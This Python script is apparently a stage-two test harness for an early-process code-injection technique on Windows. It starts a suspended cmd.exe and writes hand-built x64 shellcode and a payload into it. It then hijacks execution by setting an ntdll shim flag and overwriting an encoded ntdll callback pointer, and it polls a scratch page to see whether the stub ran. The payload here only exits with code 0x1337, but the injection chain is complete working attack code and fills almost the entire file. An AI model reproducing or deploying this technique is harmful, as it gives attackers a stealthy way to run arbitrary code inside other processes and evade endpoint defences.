# -*- coding: utf-8 -*-
"""ec_stage2_harness_v5.py - probe stub v5: same as v4 + writes to a scratch
page in the target:
  scratch[0]='O'          -> the stub ran (callback fired)
  scratch[1]=NtQueueApcThread status low byte
Target: cmd /c ping (long-lived). Verdict matrix tells whether the APC was
queued and why the payload didn't fire."""
import ctypes
import os
import struct
import sys
import time
from ctypes import wintypes

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ec_stage2_harness import (scan_anchors, rol64, k32,
                               STARTUPINFOW, PROCESS_INFORMATION,
                               MEM_COMMIT, MEM_RESERVE, PAGE_RW, PAGE_ER,
                               PAGE_ERW)

STUB_SIZE = 0x80


def build_stub_v5(shims, scratch, payload, ntqapc, param):
    st = bytearray(b"\xCC" * STUB_SIZE)
    o = 0

    def imm(code_bytes, val):
        nonlocal o
        st[o:o + len(code_bytes)] = code_bytes
        st[o + len(code_bytes):o + len(code_bytes) + 8] = struct.pack("<Q", val)
        o += len(code_bytes) + 8

    imm(b"\x48\xb8", shims)                # mov rax, shims
    st[o:o + 3] = b"\xc6\x00\x00"; o += 3  # mov byte [rax], 0
    imm(b"\x48\xb8", scratch)              # mov rax, SCRATCH
    st[o:o + 3] = b"\xc6\x00\x4f"; o += 3  # mov byte [rax], 'O'
    imm(b"\x49\xb8", param)                # mov r8, parameter
    imm(b"\x48\xb8", payload)              # mov rax, payload
    st[o:o + 3] = b"\x48\x89\xc2"; o += 3  # mov rdx, rax
    st[o:o + 3] = b"\x4d\x31\xc9"; o += 3  # xor r9, r9
    st[o:o + 4] = b"\x48\x83\xec\x28"; o += 4
    st[o:o + 8] = b"\x48\xc7\x44\x24\x20\x00\x00\x00\x00"; o += 8
    st[o:o + 7] = b"\x48\xc7\xc1\xfe\xff\xff\xff"; o += 7  # mov rcx,-2
    imm(b"\x48\xb8", ntqapc)               # mov rax, NtQueueApcThread
    st[o:o + 2] = b"\xff\xd0"; o += 2      # call rax
    imm(b"\x49\xb8", scratch)              # mov r8, SCRATCH
    st[o:o + 4] = b"\x49\x89\x40\x08"; o += 4  # mov [r8+8], rax  (full status)
    st[o:o + 4] = b"\x41\x88\x40\x01"; o += 4  # mov [r8+1], al
    st[o:o + 4] = b"\x48\x83\xc4\x28"; o += 4
    st[o:o + 1] = b"\xc3"; o += 1
    return bytes(st), o


def probe_exitprocess():
    h = k32.GetModuleHandleW("kernel32.dll")
    ep = k32.GetProcAddress(h, b"ExitProcess")
    return (b"\x48\x83\xec\x28" + b"\xb9\x37\x13\x00\x00"
            + b"\x48\xb8" + struct.pack("<Q", ep) + b"\xff\xd0")


def main():
    hits = scan_anchors()
    nt_base = k32.GetModuleHandleW("ntdll.dll")
    shims = nt_base + hits["shims"]
    pfn = nt_base + hits["pfn"]
    ntq = k32.GetProcAddress(nt_base, b"NtQueueApcThread")
    cookie = ctypes.c_uint32.from_address(0x7FFE0330).value

    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    target_exe = os.path.join(os.environ["SystemRoot"], "System32", "cmd.exe")
    cmd = ctypes.create_unicode_buffer('"%s" /c ping -n 30 127.0.0.1 >nul' % target_exe)
    if not k32.CreateProcessW(None, cmd, None, None, False, 0x4 | 0x08000000, None, None,
                              ctypes.byref(si), ctypes.byref(pi)):
        print("CreateProcessW failed", k32.GetLastError()); return 2
    hp, ht, tpid = pi.hProcess, pi.hThread, pi.dwProcessId
    got = ctypes.c_size_t(0)

    stub_va = k32.VirtualAllocEx(hp, None, STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    pay_va = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_ERW)
    scr_va = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_RW)

    payload = probe_exitprocess()
    stub, slen = build_stub_v5(shims, scr_va, pay_va, ntq, 0)
    ok = k32.WriteProcessMemory(hp, ctypes.c_void_p(stub_va), stub, slen, ctypes.byref(got))
    ok &= k32.WriteProcessMemory(hp, ctypes.c_void_p(pay_va), payload, len(payload), ctypes.byref(got))
    old = wintypes.DWORD(0)
    k32.VirtualProtectEx(hp, ctypes.c_void_p(stub_va), STUB_SIZE, PAGE_ER, ctypes.byref(old))

    k32.WriteProcessMemory(hp, ctypes.c_void_p(shims), b"\x01", 1, ctypes.byref(got))
    enc = rol64(stub_va ^ cookie, 64 - (cookie & 63))
    k32.WriteProcessMemory(hp, ctypes.c_void_p(pfn), struct.pack("<Q", enc), 8, ctypes.byref(got))
    print("pid=%d stub=0x%x pay=0x%x scr=0x%x writes=%s" %
          (tpid, stub_va, pay_va, scr_va, bool(ok)))

    k32.ResumeThread(ht)

    # poll the scratch page
    t0 = time.time()
    fired = False
    while time.time() - t0 < 15:
        buf = (ctypes.c_char * 16)()
        k32.ReadProcessMemory(hp, ctypes.c_void_p(scr_va), buf, 16, ctypes.byref(got))
        if buf.raw[:1] == b"O":
            fired = True
            print("t+%.1fs STUB RAN status=0x%08x" % (time.time() - t0, struct.unpack_from("<I", buf.raw, 8)[0]))
            break
        code = wintypes.DWORD()
        k32.GetExitCodeProcess(hp, ctypes.byref(code))
        if code.value != 259:
            print("target died early exit=0x%x" % code.value)
            break
        time.sleep(0.5)

    if not fired:
        buf = (ctypes.c_char * 16)()
        k32.ReadProcessMemory(hp, ctypes.c_void_p(scr_va), buf, 16, ctypes.byref(got))
        print("stub NEVER ran (scratch=%r)" % buf.raw)
    code = wintypes.DWORD()
    time.sleep(3)
    k32.GetExitCodeProcess(hp, ctypes.byref(code))
    print("final exit=0x%x alive=%s verdict=%s" %
          (code.value, code.value == 259,
           "PASS" if code.value == 0x1337 else ("STUB-RAN-NO-APC" if fired else "STUB-NEVER-RAN")))
    if code.value == 259:
        k32.TerminateProcess(hp, 1)
    k32.CloseHandle(ht); k32.CloseHandle(hp)


if __name__ == "__main__":
    main()
